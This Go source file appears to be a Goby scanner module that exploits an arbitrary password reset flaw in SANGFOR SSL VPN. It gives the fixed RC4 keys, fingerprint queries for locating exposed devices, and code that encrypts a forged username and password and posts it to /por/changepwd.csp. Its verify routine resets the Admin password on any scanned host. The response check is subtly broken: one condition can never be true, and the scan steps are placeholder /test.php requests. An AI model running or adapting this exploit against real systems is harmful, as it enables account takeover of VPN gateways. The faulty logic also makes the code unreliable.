package exploits

import (
	"crypto/rc4"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SANGFOR SSL-VPN Arbitrary password reset vulnerability",
    "Description": "<p>SANGFOR ssl VPN is an ipsec/ssl two in one VPN product that can be deployed in the public cloud virtualization environment, which helps all industry units have the ability to easily complete the external security release of cloud services. At the same time, it provides services to quickly connect to the cloud network and run internal applications using any mainstream device at any time and in any place, and ensures the information security of units through multi-dimensional protection from users, terminals to links and services, Avoid sensitive data leakage. It has the characteristics of simple deployment, low maintenance cost and strong cloud adaptability.</p><p>SANGFOR SSL VPN has an arbitrary user password reset vulnerability, and the key parameters are encrypted with RC4. The encryption key is fixed in the specified version. The key of m7.6.6r1 is 20181118, and the key of m7.6.1 is 20100720. Other versions need to be tested. An attacker can use this vulnerability to reset the password of any user and obtain the corresponding user rights.</p>",
    "Product": "SANGFOR-SSL VPN",
    "Homepage": "https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn",
    "DisclosureDate": "2022-07-29",
    "Author": "su18@javaweb.org",
    "FofaQuery": "body=\"login_psw.csp\" || header=\"TWFID\" || banner=\"Set-Cookie: TWFID\" || body=\"luyi 20120223\" || title=\"Sangfor-SSL\" || (body=\"<font color=\\\"white\\\">深信服科技版权所有\" && body=\"SSL VPN\") || (title==\"SSL VPN数据中心\" && cert=\"Organization: Sangfor\") || (title==\"welcome to ssl vpn\" && cert=\"Organization: sinfor\") || (cert=\"Organization: sinfor\" && banner=\"Set-Cookie: TWFID=\")",
    "GobyQuery": "body=\"login_psw.csp\" || header=\"TWFID\" || banner=\"Set-Cookie: TWFID\" || body=\"luyi 20120223\" || title=\"Sangfor-SSL\" || (body=\"<font color=\\\"white\\\">深信服科技版权所有\" && body=\"SSL VPN\") || (title==\"SSL VPN数据中心\" && cert=\"Organization: Sangfor\") || (title==\"welcome to ssl vpn\" && cert=\"Organization: sinfor\") || (cert=\"Organization: sinfor\" && banner=\"Set-Cookie: TWFID=\")",
    "Level": "3",
    "Impact": "<p>SANGFOR SSL VPN has an arbitrary user password reset vulnerability, and the key parameters are encrypted with RC4. The encryption key is fixed in the specified version. The key of m7.6.6r1 is 20181118, and the key of m7.6.1 is 20100720. Other versions need to be tested. An attacker can use this vulnerability to reset the password of any user and obtain the corresponding user rights.</p>",
    "Recommendation": "<p>Please contact the manufacturer for security patch update: <a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn\">https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn</a></p>",
    "Translation": {
        "CN": {
            "Name": "深信服 SSL VPN 任意密码重置漏洞",
            "Product": "深信服-SSL VPN",
            "Description": "<p>深信服VSSL VPN是可以部署在公有云虚拟化环境的 IPsec/SSL 二合一 VPN产品，帮助各行业单位具备将云端业务轻松完成对外安全发布的能力，同时提供在任何时候、任何场所，使用任何主流设备快速接入云端网络、运行内部应用的服务，通过从用户、终端到链路和服务的多维度防护，保障单位信息安全，避免敏感数据泄露。具有部署简单、维护成本低、云端适应能力强等特点。<br></p><p>深信服 SSL VPN 存在任意用户密码重置漏洞，关键参数使用 RC4 加密，加密 key 在指定版本是固定的， M7.6.6R1 的 key 为 20181118，M7.6.1 key 为 20100720，其他版本有待测试。攻击者可以利用此漏洞重置任意用户密码，获取对应用户权限。</p>",
            "Recommendation": "<p>请联系厂商进行安全补丁更新。<a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn\" target=\"_blank\">https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">深信服 SSL VPN 存在任意用户密码重置漏洞，关键参数使用 RC4 加密，加密 key 在指定版本是固定的， M7.6.6R1 的 key 为 20181118，M7.6.1 key 为 20100720，其他版本有待测试。攻击者可以利用此漏洞重置任意用户密码，获取对应用户权限。</span><br></p>",
            "VulType": [
                "权限绕过",
                "未授权访问"
            ],
            "Tags": [
                "权限绕过",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "SANGFOR SSL-VPN Arbitrary password reset vulnerability",
            "Product": "SANGFOR-SSL VPN",
            "Description": "<p>SANGFOR&nbsp;ssl VPN is an ipsec/ssl two in one VPN product that can be deployed in the public cloud virtualization environment, which helps all industry units have the ability to easily complete the external security release of cloud services. At the same time, it provides services to quickly connect to the cloud network and run internal applications using any mainstream device at any time and in any place, and ensures the information security of units through multi-dimensional protection from users, terminals to links and services, Avoid sensitive data leakage. It has the characteristics of simple deployment, low maintenance cost and strong cloud adaptability.<br></p><p><span style=\"font-size: 16px; color: rgb(0, 0, 0);\"></span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">SANGFOR SSL VPN has an arbitrary user password reset vulnerability, and the key parameters are encrypted with RC4. The encryption key is fixed in the specified version. The key of m7.6.6r1 is 20181118, and the key of m7.6.1 is 20100720. Other versions need to be tested.</span><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">&nbsp;An attacker can use this vulnerability to reset the password of any user and obtain the corresponding user rights.</span><br></p>",
            "Recommendation": "<p>Please contact the manufacturer for security patch update: <a href=\"https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn\">https://www.sangfor.com.cn/product-and-solution/sangfor-security/ssl-vpn</a></p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">SANGFOR&nbsp;SSL VPN has an arbitrary user password reset vulnerability, and the key parameters are encrypted with RC4. The encryption key is fixed in the specified version. The key of m7.6.6r1 is 20181118, and the key of m7.6.1 is 20100720. Other versions need to be tested.</span><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">&nbsp;An attacker can use this vulnerability to reset the password of any user and obtain the corresponding user rights.</span><br></p>",
            "VulType": [
                "Permission Bypass",
                "Unauthorized Access"
            ],
            "Tags": [
                "Permission Bypass",
                "Unauthorized Access"
            ]
        }
    },
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "Admin",
            "show": ""
        },
        {
            "name": "password",
            "type": "input",
            "value": "kissbyfire",
            "show": ""
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "Unauthorized Access"
    ],
    "VulType": [
        "Permission Bypass",
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [],
    "CNVD": [],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Is0day": false,
    "PocId": "10695"
}`

	// RC4 加密脚本
	RC4Encrypt142987342 := func(key []byte, data []byte) []byte {
		c, _ := rc4.NewCipher(key)
		dst := make([]byte, len(data))
		c.XORKeyStream(dst, data)
		return dst
	}

	// 指定 key 加密对应的用户名/密码
	generateRC4EncryptData92384729 := func(username string, password string, key string) string {
		data := ",username=" + username + ",ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=" + password
		result := RC4Encrypt142987342([]byte(key), []byte(data))
		return hex.EncodeToString(result)
	}

	exploitSangFor902342804 := func(u *httpclient.FixUrl, username string, password string, key string) bool {

		// 根据指定的用户密码、key 生成对应的 payload
		str := generateRC4EncryptData92384729(username, password, key)
		// 攻击
		cfg := httpclient.NewPostRequestConfig("/por/changepwd.csp")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "sessReq=clusterd&sessid=0&str=" + str + "&len=" + strconv.Itoa(len(str))

		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.StatusCode == 200 && !strings.Contains(resp.Utf8Html, "You don't have permission to access this page on this server.") && !strings.Contains(resp.Utf8Html, "ErrorCode") && !strings.Contains(resp.Utf8Html, "3") && !strings.Contains(resp.Utf8Html, "")
		}

		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 尝试修改用户 Admin 的密码
			result1 := exploitSangFor902342804(u, "Admin", "kissbyfire", "20100720")
			result2 := exploitSangFor902342804(u, "Admin", "kissbyfire", "20181118")

			return result1 || result2
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			username := ss.Params["username"].(string)
			password := ss.Params["password"].(string)

			result1 := exploitSangFor902342804(expResult.HostInfo, username, password, "20100720")
			result2 := exploitSangFor902342804(expResult.HostInfo, username, password, "20181118")

			if result1 || result2 {
				expResult.Success = true
				expResult.Output = "攻击已成功，用户名：" + username + ";密码：" + password
			}

			return expResult
		},
	))
}
